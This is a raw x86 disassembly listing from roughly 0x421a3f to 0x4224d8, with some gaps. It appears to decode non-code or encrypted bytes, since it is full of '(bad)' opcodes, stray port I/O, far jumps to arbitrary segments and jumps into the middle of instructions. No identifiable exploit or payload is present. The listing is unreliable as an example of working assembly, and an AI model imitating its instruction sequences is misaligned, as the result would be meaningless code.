  421a3f:	dec    esi
  421a40:	adc    BYTE PTR [edi+0x13313a7d],0x40
  421a47:	mov    ebp,0x44428369
  421a4c:	mov    ch,al
  421a4e:	das    
  421a4f:	sub    BYTE PTR [edi-0x7],ah
  421a52:	les    esp,FWORD PTR [ebx+ecx*4+0x5]
  421a56:	mov    ebp,0xac898317
  421a5b:	jnp    0x421a9d
  421a5d:	mov    ebx,DWORD PTR [ebp+0x19f2b846]
  421a63:	mov    ecx,0x5bb5f0b2
  421a68:	mov    ebx,0x2ee3f58d
  421a6d:	ss nop
  421a6f:	sar    DWORD PTR [eax],1
  421a71:	ret    
  421a72:	sti    
  421a73:	mov    dh,0xf1
  421a75:	and    eax,0xf16f67fa
  421a7a:	aaa    
  421a7b:	cmp    DWORD PTR [esi+0x61be3e76],edi
  421a81:	loopne 0x421aba
  421a83:	mov    al,0x6d
  421a85:	mov    eax,0xa7631c64
  421a8a:	jp     0x421a4d
  421a8c:	scas   al,BYTE PTR es:[edi]
  421a8d:	or     al,0xf9
  421a8f:	lods   eax,DWORD PTR ds:[esi]
  421a90:	(bad)  
  421a91:	jmp    0xf073:0x54ca0916
  421a98:	out    0xd5,eax
  421a9a:	pusha  
  421a9b:	jl     0x421a9e
  421a9d:	pop    esp
  421a9e:	dec    ebx
  421a9f:	icebp  
  421aa0:	data16 jno 0x421a77
  421aa3:	ret    
  421aa4:	jne    0x421b20
  421aa6:	call   FWORD PTR [eax+0x5ce32e3b]
  421aac:	aas    
  421aad:	mov    eax,?
  421aaf:	mov    eax,0x5861f4d9
  421ab4:	pop    DWORD PTR [ecx]
  421ab6:	mov    esi,0x1d22ffa7
  421abb:	psubb  mm0,QWORD PTR [edi]
  421abe:	push   cs
  421abf:	je     0x383a189e
  421ac5:	jmp    0x8366:0x5187ea25
  421acc:	ret    0x9398
  421acf:	pop    esi
  421ad0:	mov    ds:0x58461de1,al
  421ad5:	shl    BYTE PTR [edx+edx*2+0x42a02222],0x9
  421add:	dec    eax
  421ade:	add    al,0xea
  421ae0:	pop    eax
  421ae1:	fld    st(7)
  421ae3:	mov    ds:0x776bda1e,al
  421ae8:	and    edx,DWORD PTR [edi+0x6b]
  421aeb:	std    
  421aec:	mov    edx,0x15ce4dd
  421af1:	retf   
  421af2:	add    bh,BYTE PTR [esi]
  421af4:	push   ebx
  421af5:	mul    DWORD PTR [ebp+0xb]
  421af8:	call   0xa9dbe467
  421afd:	test   al,0x1f
  421aff:	push   0xff6feae0
  421b04:	mov    eax,0xa11802e5
  421b09:	addr16 push ss
  421b0b:	inc    ecx
  421b0c:	aas    
  421b0d:	push   ss
  421b0e:	ret    
  421b0f:	sub    eax,0x93
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dl,dh
  421b81:	push   edi
  421b82:	dec    eax
  421b83:	sar    BYTE PTR [ebx+0x5000167],0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	cmp    eax,0x79bdddd3
  421b91:	mov    edi,0x36f51668
  421b96:	jno    0x421b78
  421b98:	cwde   
  421b99:	call   0x3d525006
  421b9e:	rcl    DWORD PTR [ebp-0x7d],1
  421ba1:	xor    al,0xce
  421ba3:	push   0xffffffbf
  421ba5:	fs or  al,0xda
  421ba8:	dec    ecx
  421ba9:	stos   DWORD PTR es:[edi],eax
  421baa:	out    0x58,al
  421bac:	imul   eax,DWORD PTR [ebx+0x65],0xb7498124
  421bb3:	inc    ebx
  421bb4:	dec    ecx
  421bb5:	aas    
  421bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bb7:	cmp    bh,ch
  421bb9:	ja     0x421b54
  421bbb:	push   ecx
  421bbc:	ficomp WORD PTR [ecx-0x62781453]
  421bc2:	dec    eax
  421bc3:	call   0xf07:0xffe894d3
  421bca:	xchg   edx,eax
  421bcb:	call   0xc77a:0x83d09d1
  421bd2:	cdq    
  421bd3:	cmp    al,al
  421bd5:	xchg   esi,eax
  421bd6:	xchg   ecx,eax
  421bd7:	dec    esp
  421bd8:	mov    al,ds:0x57067ea4
  421bdd:	cmp    BYTE PTR [ebx-0x58],ah
  421be0:	fdiv   QWORD PTR [ebp+0x42b39415]
  421be6:	ret    
  421be7:	leave  
  421be8:	pop    ebp
  421be9:	jno    0x421b83
  421beb:	stos   DWORD PTR es:[edi],eax
  421bec:	xchg   esi,eax
  421bed:	add    al,0xad
  421bef:	clc    
  421bf0:	sti    
  421bf1:	mov    edi,0x81911136
  421bf6:	push   esp
  421bf7:	mov    dh,0x7
  421bf9:	mov    DWORD PTR [eax-0x23],ebp
  421bfc:	add    eax,0xa7fb76d2
  421c01:	mov    ebp,0xd68e7215
  421c06:	fdiv   st(7),st
  421c08:	cmp    al,0x17
  421c0a:	push   DWORD PTR [edx]
  421c0c:	ret    
  421c0d:	loopne 0x421c5f
  421c0f:	xchg   ecx,eax
  421c10:	mov    dh,0x7e
  421c12:	inc    edx
  421c13:	mov    ah,0xa5
  421c15:	sti    
  421c16:	stos   DWORD PTR es:[edi],eax
  421c17:	fadd   QWORD PTR [esi+0x8]
  421c1a:	mov    bh,BYTE PTR [edx+0x2f]
  421c1d:	imul   eax,DWORD PTR [edx],0x5f
  421c20:	mov    WORD PTR [edx],cs
  421c22:	scas   eax,DWORD PTR es:[edi]
  421c23:	outs   dx,BYTE PTR ds:[esi]
  421c24:	imul   eax,DWORD PTR [eax+edx*8+0x4e],0xffffffe5
  421c29:	(bad)  
  421c2a:	mov    ecx,0xc7c0bc8c
  421c2f:	mov    eax,0x86bac813
  421c34:	pop    edi
  421c35:	nop
  421c36:	sub    edx,0x25
  421c39:	inc    ecx
  421c3a:	pop    eax
  421c3b:	cmp    al,0xda
  421c3d:	push   ss
  421c3e:	imul   edx,DWORD PTR [eax+0x52ec9d3e],0x74
  421c45:	cli    
  421c46:	into   
  421c47:	addr16 out dx,al
  421c49:	mov    ds:0x6f515531,al
  421c4e:	not    DWORD PTR ds:[ecx-0x6a]
  421c52:	sahf   
  421c53:	and    eax,0x770c9ed2
  421c58:	inc    ebx
  421c59:	test   al,0xdc
  421c5b:	push   es
  421c5c:	dec    esi
  421c5d:	lea    ecx,cs:[ecx]
  421c60:	or     esi,edx
  421c62:	in     eax,0x70
  421c64:	fist   DWORD PTR [esi+0x7f]
  421c67:	ins    DWORD PTR es:[edi],dx
  421c68:	jl     0x421ce7
  421c6a:	test   al,0x36
  421c6c:	into   
  421c6d:	ins    BYTE PTR es:[edi],dx
  421c6e:	pop    ss
  421c6f:	and    DWORD PTR [ebp+0x7a],eax
  421c72:	jbe    0x421cb3
  421c74:	dec    ebp
  421c75:	div    BYTE PTR [edx+0x1fb457d5]
  421c7b:	xchg   ecx,eax
  421c7c:	pop    esp
  421c7d:	ret    0x9ed8
  421c80:	fs ror esi,1
  421c83:	test   BYTE PTR [eax-0x24],cl
  421c86:	stc    
  421c87:	pop    es
  421c88:	cmp    eax,0x1994d1d1
  421c8d:	mov    eax,0x96440f
	...
  421cf2:	add    BYTE PTR [eax],al
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	jl     0x421d2f
  421d02:	and    edx,DWORD PTR [ebp+0x168c0]
  421d08:	add    eax,0x30000001
  421d0d:	xor    eax,0xd12e995d
  421d12:	mov    ch,0x52
  421d14:	in     eax,0x9f
  421d16:	inc    eax
  421d17:	push   cs
  421d18:	ins    BYTE PTR es:[edi],dx
  421d19:	(bad)  
  421d1a:	popf   
  421d1b:	jmp    0x956d6a12
  421d20:	jb     0x421d94
  421d22:	mov    BYTE PTR gs:[esi+eax*4],ah
  421d26:	das    
  421d27:	sti    
  421d28:	add    DWORD PTR [edx+edx*1],edx
  421d2b:	add    DWORD PTR [esi-0x33cf47e7],ebx
  421d31:	jge    0x421cd9
  421d33:	fucom  st(6)
  421d35:	repnz mov ebp,0x1cba9d5
  421d3b:	ret    
  421d3c:	add    ecx,DWORD PTR [ebx]
  421d3e:	xchg   DWORD PTR [edx+0x7501612],ecx
  421d44:	pop    ds
  421d45:	loop   0x421ce2
  421d47:	mov    dh,0x2b
  421d49:	shl    DWORD PTR [ebx+0x21],0x93
  421d4d:	aaa    
  421d4e:	adc    eax,DWORD PTR [ebx]
  421d50:	jbe    0x421cd4
  421d52:	cmp    BYTE PTR [esi+ecx*1],dh
  421d55:	(bad)  
  421d56:	adc    al,0xbc
  421d58:	rol    DWORD PTR [edi-0x5ef23b30],cl
  421d5e:	loop   0x421d67
  421d60:	aam    0x5b
  421d62:	push   es
  421d63:	or     eax,0xebba1f34
  421d68:	(bad)  
  421d69:	mov    eax,ds:0xf6c73260
  421d6e:	add    eax,0x4cb17e49
  421d73:	sbb    ebx,0xfffffff1
  421d76:	mov    eax,0x6ec31598
  421d7b:	add    DWORD PTR [eax-0x49c14317],esi
  421d81:	stos   BYTE PTR es:[edi],al
  421d82:	mov    BYTE PTR [edx+edx*1+0x6a],bl
  421d86:	sub    DWORD PTR [ebp-0x54],edx
  421d89:	enter  0x36e7,0xc1
  421d8d:	ret    0x6257
  421d90:	mov    eax,ds:0xc2a273de
  421d95:	adc    eax,0xc2174297
  421d9a:	(bad)  
  421d9b:	pop    esp
  421d9c:	xchg   ecx,eax
  421d9d:	sti    
  421d9e:	imul   eax,DWORD PTR [ecx-0x5db3a0e7],0x38
  421da5:	or     al,0x1f
  421da7:	pop    ebp
  421da8:	test   al,0x64
  421daa:	jo     0x421d87
  421dac:	push   ecx
  421dad:	or     al,0x82
  421daf:	mov    BYTE PTR [edi-0x68],dh
  421db2:	(bad)
  421db5:	or     bl,BYTE PTR [edi-0x1a]
  421db8:	and    bl,BYTE PTR [ebx+0x64]
  421dbb:	dec    esi
  421dbc:	in     al,0x27
  421dbe:	add    DWORD PTR [edi+0x38],edx
  421dc1:	mov    WORD PTR [ecx+0x4128c1a],es
  421dc7:	add    BYTE PTR [esi],bl
  421dc9:	addr16 inc esi
  421dcb:	(bad)  
  421dcc:	and    dh,BYTE PTR [eax-0x28]
  421dcf:	xchg   DWORD PTR [eax+0x7c],ebp
  421dd2:	jmp    0x421d99
  421dd4:	mov    bh,0x9b
  421dd6:	xchg   ebx,eax
  421dd7:	and    cl,0xd4
  421dda:	in     al,dx
  421ddb:	into   
  421ddc:	pop    edx
  421ddd:	cmp    cl,BYTE PTR [ebx+0x6f]
  421de0:	sbb    ch,dl
  421de2:	mov    al,ds:0x60f7d72f
  421de7:	outs   dx,DWORD PTR ds:[esi]
  421de8:	outs   dx,BYTE PTR ds:[esi]
  421de9:	adc    ah,BYTE PTR [ecx+0x69]
  421dec:	adc    eax,0x6b97d044
  421df1:	lds    ebp,FWORD PTR [edi-0x14]
  421df4:	push   0xffffffe4
  421df6:	imul   eax,esi,0x32
  421df9:	aas    
  421dfa:	gs (bad) 
  421dfc:	popf   
  421dfd:	mov    WORD PTR [esp+ebp*4+0x22],gs
  421e01:	cwde   
  421e02:	or     BYTE PTR [edx],cl
  421e04:	clc    
  421e05:	mov    ds:0xced7446c,eax
  421e0a:	mov    esp,0x33b759ff
  421e0f:	pop    ecx
  421e10:	out    0x0,eax
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	xchg   ecx,eax
  421e81:	cmp    dh,dl
  421e83:	lds    ebp,FWORD PTR fs:[ecx+0x1]
  421e87:	add    BYTE PTR ds:0x9e000001,al
  421e8d:	adc    BYTE PTR [ebx],bl
  421e8f:	xchg   edi,eax
  421e90:	ins    DWORD PTR es:[edi],dx
  421e91:	pushf  
  421e92:	call   FWORD PTR [eax-0x64]
  421e95:	bound  esp,QWORD PTR [ebp-0x82b1f31]
  421e9b:	xor    al,0xd7
  421e9d:	scas   al,BYTE PTR es:[edi]
  421e9e:	test   eax,0x3ff3b010
  421ea3:	mov    ecx,0xdd8d5b60
  421ea8:	mov    dl,0xad
  421eaa:	adc    DWORD PTR [edi],ebx
  421eac:	jae    0x421e71
  421eae:	cwde   
  421eaf:	pop    edx
  421eb0:	pushf  
  421eb1:	ficomp WORD PTR [ebx-0x66040c24]
  421eb7:	test   eax,0xa93addea
  421ebc:	and    DWORD PTR cs:[ebx+0x42],eax
  421ec0:	aas    
  421ec1:	(bad)  
  421ec2:	fxam   
  421ec4:	jb     0x421e9b
  421ec6:	mov    cl,0x98
  421ec8:	xor    bx,sp
  421ecb:	bound  edi,QWORD PTR [edi]
  421ecd:	xor    dl,dl
  421ecf:	(bad)  
  421ed0:	cli    
  421ed1:	jno    0x421e56
  421ed3:	jp     0x421f2b
  421ed5:	push   0x31d5ec72
  421eda:	cdq    
  421edb:	adc    BYTE PTR [edx+0x1c],dl
  421ede:	pop    ss
  421edf:	out    0xb3,eax
  421ee1:	and    eax,0x561900ad
  421ee6:	jge    0x421f64
  421ee8:	(bad)  
  421ee9:	and    eax,0x820a0f0d
  421eee:	sub    DWORD PTR [ebp-0x1c223db7],esi
  421ef4:	cmp    DWORD PTR [edx+0xe739236],ebx
  421efa:	je     0x421ede
  421efc:	add    eax,0x45337969
  421f01:	jne    0x421eeb
  421f03:	repnz inc esp
  421f05:	repnz mov ah,0xe6
  421f08:	cwde   
  421f09:	aaa    
  421f0a:	sub    eax,0x92d630f8
  421f0f:	cmp    al,0x4f
  421f11:	mov    cl,0x29
  421f13:	jo     0x421f6c
  421f15:	adc    edi,DWORD PTR [edx-0x7c6bd83a]
  421f1b:	pop    ds
  421f1c:	or     ch,ch
  421f1e:	push   esi
  421f1f:	shl    ah,cl
  421f21:	xor    eax,0xf76fb8a5
  421f26:	adc    dl,BYTE PTR [esi+ecx*4+0x6dbf3797]
  421f2d:	lods   eax,DWORD PTR ds:[esi]
  421f2e:	(bad)  
  421f2f:	std    
  421f30:	mov    BYTE PTR [ebp+0x4613640],dh
  421f36:	or     eax,DWORD PTR [edi]
  421f38:	pop    edx
  421f39:	or     al,0x9e
  421f3b:	or     ah,dh
  421f3d:	sar    ah,0xde
  421f40:	pop    ss
  421f41:	lods   eax,DWORD PTR ds:[esi]
  421f42:	test   al,0xde
  421f44:	sub    esi,eax
  421f46:	push   ebp
  421f47:	jmp    0xb71eb5d5
  421f4c:	jbe    0x421eda
  421f4e:	and    eax,0xd8d5ea08
  421f53:	jae    0x421fd3
  421f55:	sar    esi,0x91
  421f58:	mov    al,0x5f
  421f5a:	dec    esi
  421f5b:	inc    ebp
  421f5c:	shr    ah,0x67
  421f5f:	jns    0x421f1b
  421f61:	je     0x421f02
  421f63:	jp     0x421f59
  421f65:	call   0xecf60402
  421f6a:	or     al,0x3
  421f6c:	inc    eax
  421f6d:	(bad)  
  421f6e:	inc    ebx
  421f6f:	(bad)  
  421f71:	jl     0x421fa3
  421f73:	mov    edi,edi
  421f75:	inc    eax
  421f76:	pop    es
  421f77:	add    al,0x8c
  421f79:	dec    ecx
  421f7a:	add    ecx,DWORD PTR ds:0xb35fb55c
  421f80:	scas   eax,DWORD PTR es:[edi]
  421f81:	jecxz  0x421f17
  421f83:	in     eax,0x60
  421f85:	jp     0x421f4c
  421f87:	sbb    esi,DWORD PTR [edi+0x57c0886c]
  421f8d:	add    dh,BYTE PTR [edi]
  421f8f:	call   0x421fc5
	...
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	xor    ax,WORD PTR [ebp+0x6aca9cb7]
  422006:	add    DWORD PTR [eax],eax
  422008:	add    eax,0x60000001
  42200d:	adc    DWORD PTR [esi],esi
  42200f:	inc    edi
  422010:	sub    DWORD PTR [ebp-0x62],edx
  422013:	hlt    
  422014:	dec    ecx
  422015:	adc    ch,dh
  422017:	inc    ebp
  422018:	jmp    0xd860:0x990b0b57
  42201f:	add    ebp,DWORD PTR [edi+0x33]
  422022:	scas   al,BYTE PTR es:[edi]
  422023:	ja     0x421ffd
  422025:	sub    eax,0x123468bc
  42202a:	mov    edx,esi
  42202c:	xor    DWORD PTR [edi],0xfc350d14
  422032:	es test eax,0x7d4abf96
  422038:	fsubr  st(6),st
  42203a:	std    
  42203b:	mov    dh,0xb
  42203d:	call   0xb498:0x6437fff3
  422044:	scas   al,BYTE PTR es:[edi]
  422045:	lahf   
  422046:	lea    esp,[ebx-0x67d4a8b5]
  42204c:	jne    0x422048
  42204e:	push   0x9
  422050:	mov    dl,0xb8
  422052:	jle    0x422038
  422054:	cs mov dl,0xaa
  422057:	and    bh,al
  422059:	jno    0x4220a2
  42205b:	adc    BYTE PTR [edi+0x77],ah
  42205e:	js     0x4220c1
  422060:	mov    edi,0xf07cb35e
  422065:	dec    edx
  422066:	xor    BYTE PTR [ebp+0x56765229],dh
  42206c:	test   ch,0x9a
  42206f:	push   ebp
  422070:	test   BYTE PTR [edi+0x48],bh
  422073:	and    BYTE PTR [eax],dh
  422075:	es push edi
  422077:	or     eax,0x658e6bfb
  42207c:	icebp  
  42207d:	clc    
  42207e:	repnz test eax,0x9e99f498
  422084:	pusha  
  422085:	repz mov edi,0x4a87fd62
  42208b:	repz or eax,0xdcfe158b
  422091:	and    BYTE PTR [ebp+ecx*8-0x3c],0xfe
  422096:	mov    cl,0xab
  422098:	out    dx,al
  422099:	clc    
  42209a:	adc    DWORD PTR [edi-0x75],ebp
  42209d:	out    0x33,al
  42209f:	(bad)  
  4220a0:	jo     0x422098
  4220a2:	ror    BYTE PTR [ebp-0x3d],0x89
  4220a6:	adc    esp,esi
  4220a8:	ror    bh,1
  4220aa:	mov    edx,0xaed1f44f
  4220af:	sbb    dh,al
  4220b1:	sbb    ch,BYTE PTR [esi+eiz*2-0x22]
  4220b5:	mov    edx,0xae7a9708
  4220ba:	(bad)  
  4220bb:	cwde   
  4220bc:	daa    
  4220bd:	sahf   
  4220be:	stos   BYTE PTR es:[edi],al
  4220bf:	xchg   ecx,eax
  4220c0:	fsubr  QWORD PTR [ebp-0x5a54fa10]
  4220c6:	xchg   BYTE PTR ds:0xff94e3bc,al
  4220cc:	sub    eax,0x3c792b6a
  4220d1:	rol    DWORD PTR [edi+0x5e29076],cl
  4220d7:	popf   
  4220d8:	std    
  4220d9:	and    al,0xab
  4220db:	jae    0x42210c
  4220dd:	mov    eax,ds:0xed7b6aa4
  4220e2:	lds    edx,FWORD PTR [eax]
  4220e4:	pop    edi
  4220e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e6:	sbb    ecx,edx
  4220e8:	jl     0x4220bd
  4220ea:	fisubr DWORD PTR [edi-0x3]
  4220ed:	lods   al,BYTE PTR ds:[esi]
  4220ee:	mov    bl,0x4e
  4220f0:	jp     0x4220f6
  4220f2:	retf   
  4220f3:	dec    ecx
  4220f4:	and    DWORD PTR [edi-0x1d],ebp
  4220f7:	jae    0x42214d
  4220f9:	dec    edx
  4220fa:	xchg   BYTE PTR [ecx],ah
  4220fc:	mov    esp,0xb4d8f423
  422101:	dec    edi
  422102:	aas    
  422103:	cli    
  422104:	or     ah,BYTE PTR [edi-0x75]
  422107:	lock xor BYTE PTR [ebx+0x1f],al
  42210b:	bound  edi,QWORD PTR [ebx]
  42210d:	jmp    0x0:0xe6544e
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebp,DWORD PTR [esi*4+0x6bcf2163]
  422186:	add    DWORD PTR [eax],eax
  422188:	add    eax,0x8c000001
  42218d:	cli    
  42218e:	mov    esi,0xf4826af
  422193:	push   ecx
  422194:	push   esi
  422195:	mov    ?,WORD PTR [ecx]
  422197:	mov    bl,0xe3
  422199:	push   ecx
  42219a:	xchg   edx,eax
  42219b:	mov    eax,ds:0xb7ad4078
  4221a0:	or     DWORD PTR [edi+0x5cdbb3fd],ecx
  4221a6:	in     al,dx
  4221a7:	pushf  
  4221a8:	add    ebx,DWORD PTR [edi]
  4221aa:	out    0x79,eax
  4221ac:	sub    dh,BYTE PTR [ebx-0x7c]
  4221af:	stc    
  4221b0:	sbb    DWORD PTR [ecx-0x12],eax
  4221b3:	adc    eax,0x8ba9b020
  4221b8:	rcl    DWORD PTR [edi+0x41e84d46],1
  4221be:	inc    edx
  4221bf:	arpl   WORD PTR es:[esp+edi*2-0x12179d36],cx
  4221c7:	retf   
  4221c8:	ret    0x817f
  4221cb:	(bad)  
  4221cc:	int    0x3b
  4221ce:	ja     0x422230
  4221d0:	pop    esp
  4221d1:	out    dx,eax
  4221d2:	fisubr WORD PTR [ebp+0x67721896]
  4221d8:	cmp    ecx,DWORD PTR [esi+0x3f41dfec]
  4221de:	pop    esi
  4221df:	arpl   WORD PTR [edi+0x23],di
  4221e2:	pop    ss
  4221e3:	cdq    
  4221e4:	or     al,BYTE PTR [ebx]
  4221e6:	xor    al,0x43
  4221e8:	add    dh,BYTE PTR [ebp+eax*4+0x1efa9e46]
  4221ef:	xchg   esp,eax
  4221f0:	or     eax,0xc08d17f8
  4221f5:	(bad)  
  4221f6:	push   ebp
  4221f7:	mov    DWORD PTR [bx-0x4b],edx
  4221fb:	call   0x8cf5bdff
  422200:	xor    eax,0x1525e90a
  422205:	sub    BYTE PTR [ebp-0x39b21b9d],bl
  42220b:	mov    bh,0x1c
  42220d:	mov    eax,ds:0x539350a9
  422212:	sti    
  422213:	or     al,0x93
  422215:	jae    0x42219a
  422217:	int3   
  422218:	hlt    
  422219:	xor    eax,0x2e22c844
  42221e:	jne    0x422254
  422220:	(bad)  
  422221:	out    0x7d,eax
  422223:	cmp    eax,DWORD PTR [eax]
  422225:	cmp    al,0xe0
  422227:	jmp    0x4221c2
  422229:	dec    edi
  42222a:	in     eax,dx
  42222b:	(bad)  
  42222c:	sub    al,0x4f
  42222e:	mov    dl,0x92
  422230:	cs ins BYTE PTR es:[edi],dx
  422232:	mov    DWORD PTR [ecx+0x73],edi
  422235:	sub    eax,0xd33ec5c6
  42223a:	pop    es
  42223b:	add    edx,eax
  42223d:	fld    QWORD PTR [edx+0xa]
  422240:	ret    0x237f
  422243:	fwait
  422244:	sub    DWORD PTR [esi-0x34646fe4],0xd64a0c67
  42224e:	nop
  42224f:	push   0x1f470b5b
  422254:	mov    al,0x58
  422256:	pop    ss
  422257:	add    BYTE PTR [esi+0x6e],cl
  42225a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42225b:	or     esi,DWORD PTR [esi-0x42]
  42225e:	mov    edi,0x8e77e050
  422263:	(bad)  
  422264:	pop    esp
  422265:	inc    eax
  422266:	lods   eax,DWORD PTR ds:[esi]
  422267:	xchg   edi,eax
  422268:	je     0x4222be
  42226a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42226b:	(bad)  
  42226c:	or     al,0xd4
  42226e:	jns    0x422285
  422270:	pop    ebx
  422271:	jno    0x422299
  422273:	mov    dl,0x31
  422275:	scas   eax,DWORD PTR es:[edi]
  422276:	push   edi
  422277:	lods   al,BYTE PTR ds:[esi]
  422278:	jg     0x4222b9
  42227a:	mov    ds:0xd29ca5c6,eax
  42227f:	mov    WORD PTR [edx+0x1],fs
  422282:	int    0x25
  422284:	std    
  422285:	shr    DWORD PTR [edx+eiz*8],1
  422288:	(bad)  
  422289:	mov    DWORD PTR [ebp+0x175b12f3],esi
  42228f:	stc    
  422290:	add    BYTE PTR [eax],0x0
	...
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	mov    ebp,DWORD PTR [edx]
  422302:	mov    ebp,0x16cd46a
  422307:	add    BYTE PTR ds:0x8b000001,al
  42230d:	js     0x422379
  42230f:	lds    ebx,FWORD PTR [ecx+ebx*1+0x1ce0dac3]
  422316:	cmp    BYTE PTR [edx],dl
  422318:	sbb    al,0xf
  42231a:	pop    ebx
  42231b:	fcomp  QWORD PTR [edx]
  42231d:	mov    eax,0xf7d38db9
  422322:	loope  0x422318
  422324:	push   es
  422325:	sub    DWORD PTR [ebp+0x5f0c29a],0xffffff9a
  42232c:	or     BYTE PTR [ebp+0x62],al
  42232f:	jp     0x4222fa
  422331:	(bad)  
  422332:	jb     0x4222ee
  422334:	jae    0x4222e1
  422336:	inc    eax
  422337:	xor    eax,0x2fce9cf1
  42233c:	adc    eax,0x24c3f83
  422341:	xchg   ecx,edx
  422343:	ret    
  422344:	test   al,0x61
  422346:	sar    DWORD PTR [ecx+0x77],1
  422349:	pop    ds
  42234a:	and    al,0x81
  42234c:	daa    
  42234d:	data16 (bad) 
  42234f:	aad    0x13
  422351:	push   ecx
  422352:	mov    WORD PTR [ebx],gs
  422354:	fwait
  422355:	aam    0x96
  422357:	inc    ebp
  422358:	cmp    DWORD PTR [esi+0x2cacdb58],ebp
  42235e:	pop    es
  42235f:	call   0xb61f:0xac7ad5a9
  422366:	jmp    0x812af
  42236b:	inc    edi
  42236c:	stos   BYTE PTR es:[edi],al
  42236d:	mov    ch,0xc7
  42236f:	and    ecx,DWORD PTR [eax+ebx*2-0x12]
  422373:	iret   
  422374:	pop    esi
  422375:	int    0xe
  422377:	sahf   
  422378:	pusha  
  422379:	pusha  
  42237a:	pop    esi
  42237b:	mov    WORD PTR [ecx],cs
  42237d:	inc    edi
  42237e:	cli    
  42237f:	(bad)  
  422381:	fldenv [edx-0x70]
  422384:	inc    esp
  422385:	or     eax,0x39506324
  42238a:	add    DWORD PTR [ecx-0x59],esi
  42238d:	dec    eax
  42238e:	push   esi
  42238f:	nop
  422390:	test   ecx,eax
  422392:	ss loope 0x42236d
  422395:	das    
  422396:	jle    0x422318
  422398:	fiadd  DWORD PTR [edi]
  42239a:	mov    ecx,0xc72925d4
  42239f:	mov    bl,0x46
  4223a1:	mov    edi,DWORD PTR [edi+0x71]
  4223a4:	mov    ?,esi
  4223a6:	jmp    0x42235d
  4223a8:	addr16 push edx
  4223aa:	sbb    cl,dl
  4223ac:	jnp    0x4223f5
  4223ae:	fstp   DWORD PTR ds:0x4ad496dc
  4223b4:	retf   0xaeee
  4223b7:	mov    ds:0xc13034e1,eax
  4223bc:	xor    BYTE PTR [ecx+0xbd4a5e0],bl
  4223c2:	int3   
  4223c3:	mov    ebx,gs
  4223c5:	mov    ebp,0x15d0b151
  4223ca:	and    ch,dh
  4223cc:	xor    ah,BYTE PTR [ebx-0x80]
  4223cf:	mov    WORD PTR [esi+edx*1-0x3ec97ea1],ss
  4223d6:	add    al,0xa4
  4223d8:	in     eax,0x52
  4223da:	mov    edi,0x27a163bd
  4223df:	add    eax,0xbda71957
  4223e4:	mov    ah,bl
  4223e6:	jne    0x422416
  4223e8:	call   0x88b1f78
  4223ed:	sub    al,0x60
  4223ef:	mov    bl,0xe0
  4223f1:	pop    edx
  4223f2:	pushf  
  4223f3:	and    ecx,DWORD PTR [esp+eax*8]
  4223f6:	out    0xd1,eax
  4223f8:	cmc    
  4223f9:	cmp    eax,ecx
  4223fb:	or     eax,DWORD PTR [eax]
  4223fd:	outs   dx,BYTE PTR ds:[esi]
  4223fe:	mov    ds:0x8f89f5f7,eax
  422403:	xor    BYTE PTR [esp+ebx*2-0x3f229848],bh
  42240a:	dec    esi
  42240b:	shl    DWORD PTR [eax],0xf
  42240e:	shr    DWORD PTR [ecx],0x2f
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	stc    
  422481:	mov    ds,WORD PTR [edi+0x16dd92b]
  422487:	add    BYTE PTR ds:0x65000001,al
  42248d:	adc    dh,BYTE PTR [ebx-0x6fa2db69]
  422493:	pop    esi
  422494:	clc    
  422495:	cmc    
  422496:	push   ds
  422497:	cwde   
  422498:	dec    ebx
  422499:	push   0xffffff90
  42249b:	push   esp
  42249c:	xchg   edx,eax
  42249d:	ss xchg ebx,eax
  42249f:	out    dx,eax
  4224a0:	sbb    DWORD PTR [ebx],0x3a1171a7
  4224a6:	mov    ch,BYTE PTR [ecx+0x2805da8f]
  4224ac:	test   ch,bl
  4224ae:	xchg   edx,eax
  4224af:	pop    esp
  4224b0:	xchg   ax,ax
  4224b2:	popa   
  4224b3:	outs   dx,BYTE PTR ds:[esi]
  4224b4:	push   eax
  4224b5:	inc    ebp
  4224b6:	scas   eax,DWORD PTR es:[edi]
  4224b7:	jecxz  0x42247d
  4224b9:	test   edx,edi
  4224bb:	dec    esp
  4224bc:	xchg   esp,eax
  4224bd:	pop    ss
  4224be:	sti    
  4224bf:	out    0xcc,al
  4224c1:	mov    ebx,0x4b0678e8
  4224c6:	pusha  
  4224c7:	xchg   esi,eax
  4224c8:	xchg   edx,eax
  4224c9:	ret    
  4224ca:	inc    ebp
  4224cb:	(bad)  [edx]
  4224cd:	dec    ecx
  4224ce:	aam    0x5d
  4224d0:	mov    dl,0xd4
  4224d2:	jnp    0x42248c
  4224d4:	jne    0x4224fc
  4224d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224d7:	xchg   edx,eax
  4224d8:	pop    eax
